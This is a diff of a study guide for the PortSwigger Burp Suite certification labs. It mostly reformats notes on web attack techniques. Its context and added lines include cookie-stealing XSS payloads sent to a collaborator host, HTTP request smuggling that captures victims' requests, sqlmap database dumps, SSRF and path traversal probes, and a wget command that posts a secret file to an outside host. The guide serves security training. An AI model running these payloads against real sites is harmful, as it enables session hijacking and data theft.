@@ -101,7 +101,7 @@
 
 ![DOM Invader resend web messages](images/dom-invader-resend-web-messages.png)  
   
-[Testing for DOM XSS using web messages with PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
+[PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
 
 
 ## Web Cache Poison  
@@ -149,7 +149,11 @@ document.location='https://collaboration.net/?cookies='+document.cookie;
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
 
->Set test unsecure cookie in browser dev tools to do POC XSS cookie stealer.  
+>CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks.
+
++ [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
+  
+>Set a test unsecure cookie in browser dev tools to do POC XSS cookie stealer.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
@@ -179,7 +183,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
 ```  
 
->Following iframe uses *hash** character to trigger the OnHashChange **'#'** XSS  
+>Following iframe uses **hash** character to trigger the OnHashChange **'#'** XSS.  
   
 ```JavaScript
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
@@ -314,7 +318,6 @@ body:document.cookie
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
 
-
 ### DOM-Based XSS  
 
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. In the target source code look out for the following:  
@@ -365,7 +368,7 @@ body:document.cookie
 
 >Identify that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
-<sub>Change the username parameter to carlos and send the request.</sub>  
+>Change the username parameter to carlos and send the request.  
 
 ```html
 X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net
@@ -373,7 +376,7 @@ X-Host: EXPLOIT-SERVER-ID.exploit-server.net
 X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 ```  
 
-<sup>Check the exploit server log to obtain the reset link to the victim username.</sup>  
+>Check the exploit server log to obtain the reset link to the victim username.  
   
 ![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  
 
@@ -421,7 +424,7 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 
 ![TE-CL-http-request-smuggle.png](images/TE-CL-http-request-smuggle.png)  
 
->**Note:** Repeater menu ensure the **"Update Content-Length"** option is unchecked.  
+>**Note:** In certain smuggle vulnerabilities, go to Repeater menu and ensure the **"Update Content-Length"** option is unchecked.  
 
 ```
 POST / HTTP/1.1
@@ -470,7 +473,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
   
 ![Exploiting HTTP request smuggling with content-length value](images/content-length-capture-victim-request.png)  
 
-<sub>No new line at end of the smuggled POST request above^^ </sub>  
+>No new line at end of the smuggled POST request above^^.  
 
 >View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.  
   
@@ -483,13 +486,13 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 
 >Identify the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
 
-<sup>Basic Cross Site Scripting Payload escaping out of HTML document.</sup>  
+>Basic Cross Site Scripting Payload escaping out of HTML document.  
 
 ```JavaScript
  "/><script>alert(1)</script>
 ```
 
-<sub>COOKIE STEALER Payload</sub>  
+>COOKIE STEALER Payload.  
 
 ```JavaScript
 a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document.cookie;</script>
@@ -577,7 +580,7 @@ x=1
 
 [PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
   
->I fail to see how this in exam/prod can be played to be dangerous or lead to exploitation!?  
+>My opinion, this is rare scenario where users visiting site have their request stolen via HTTP Sync vulnerability in exam or live system exploited.  
   
 
 # Privilege Escalation  
@@ -614,7 +617,7 @@ Connection: close
 
 ## Password Refresh CSRF  
   
->Refresh password POST request,then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
+>Refresh password POST request, then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
 
 ```html
 POST /refreshpassword HTTP/1.1
@@ -684,7 +687,7 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
 
-<sup>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.</sup>  
+>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.  
 
 ```bash
 sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "TrackingId"
@@ -698,19 +701,19 @@ sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "Tracki
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
 
-<sub>SQLMAP determine the vulnerability, and perform initial enumeration.</sub>  
+>SQLMAP determine the vulnerability, and perform initial enumeration.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3
 ```  
 
-<sub>SQLMAP determine the database DBMS.</sub>  
+>SQLMAP determine the database DBMS.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
 ```  
 
-<sub>SQLMAP determine Database, Tables, dump, data Exfiltration.</sub>  
+>SQLMAP determine Database, Tables, dump, data Exfiltration.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
@@ -761,7 +764,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Possible to find XXE attack surface in requests that do not contain any XML.  
 
-<sub>Identify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.</sub>  
+>Identify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.  
 
 ```xml
 %26entity;
@@ -896,7 +899,7 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 >SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
 
-<sub>SSRF exploitation examples</sub>  
+>SSRF exploitation examples.  
 
 ```html
 /product/nextProduct?currentProductId=6&path=http://evil-user.net  
@@ -985,7 +988,7 @@ GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlo
 Host: localhost
 ```  
 
-<sub>**Note:** Convert the GET request to POST</sub>  
+>**Note:** Convert the GET request to POST.  
 
 ![Routing-based SSRF](images/Routing-based-SSRF.png)  
 
@@ -1012,6 +1015,12 @@ Content-Length: 0
 
 ### HTML to PDF  
 
+>Identify if SSRF can reach a server which attacker control.  
+
+```html
+<div><p>Report Heading by <img src=”https://Collaborator.com/test.png”></p>
+```  
+
 >Identify file download HTML-to-PDF convert function on target is vulnerable.  
 
 ```JavaScript
@@ -1022,9 +1031,9 @@ Content-Length: 0
 
 >Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
-[PortSwigger Research HTML-to-PDF converters vuln to SSRF](https://portswigger.net/daily-swig/html-to-pdf-converters-open-to-denial-of-service-ssrf-directory-traversal-attacks)
+[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)  
 
-[HTML to PDF converters such as wkhtmltopdf exploited to read local file(SSRF)](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/index.html)  
+>Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as wkhtmltopdf to read local file (SSRF).  
 
 ```html
 <html>
@@ -1063,7 +1072,7 @@ pdf creator: wkhtmltopdf 0.12.5
 hacktricks xss cross site scripting server side xss dynamic pdf 
 ```  
 
-<sup> SSRF Section incomplete ...need more input...</sup>  
+>SSRF Section incomplete ...need more input...  
 
 
 ## SSTI - Server Side Template Injection
@@ -1191,13 +1200,13 @@ portswigger.net/research/template-injection
 wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ```  
 
-<sup> SSTI Section ...need more input...</sup>  
+>SSTI Section ...need more input...  
 
 ## ProtoType Pollution  
 
 >A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
 
-<sub>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL</sub>
+>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
 
 ```html
 <script>
@@ -1209,7 +1218,7 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 
 ![Proto pollution](images/proto-pollution.png)  
 
-<sup> Proto pollution section is incomplete ...need more input...</sup>  
+>Proto pollution section is incomplete ...need more input...  
 
 ## JWT  
 
@@ -1250,7 +1259,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 [PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
 
-<sup> JWT section ...need more input...</sup>  
+>JWT section ...need more input...  
 
 ## CSRF  
 
@@ -1281,7 +1290,7 @@ Content-Type: text/html; charset=utf-8
 Referrer-Policy: unsafe-url
 ```  
 
-<sub>**Note:** that unlike the normal Referer header, the word **"referrer"** must be spelled correctly.</sub>  
+>**Note:** Unlike the normal Referer header spelling, the word **"referrer"** must be spelled correctly in the above code^^.  
 
 >Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the **history.pushState()** function includes a query string with target URL.  
 
@@ -1314,7 +1323,9 @@ Referrer-Policy: unsafe-url
 
 ```bash
 ../../../../../../../../../../
-```
+```  
+
+>On the admin portal the images are loaded using **imagefile=** parameter, vulnerable to directory traversal.  
 
 ```html
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
@@ -1326,9 +1337,10 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 [PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)  
   
+[PortSwigger Academy File-path-traversal](https://portswigger.net/web-security/file-path-traversal)  
 
 
-## Focus Scanning 
+## Focus Scanning  
 
 >Due to the tight time limit during engagements, scan defined insertion points for specific requests.  
 
@@ -1347,7 +1359,9 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 ## YouTube Training Playlist 
   
 [YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+
 Youtube channels:  
+
 1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
 2. [David Bombal](https://www.youtube.com/@davidbombal/videos)  
 3. [intigriti](https://www.youtube.com/@intigriti/videos)  
@@ -1362,7 +1376,8 @@ Youtube channels:
 12. [nu11 security](https://www.youtube.com/@Nul1Secur1ty/videos)  
 13. [PortSwigger](https://www.youtube.com/@PortSwiggerTV/videos)  
 14. [IppSec](https://www.youtube.com/@ippsec/videos)  
-
+15. [@tjc_](https://www.youtube.com/@tjc_/videos)  
+  
 
 ## Footnote
 
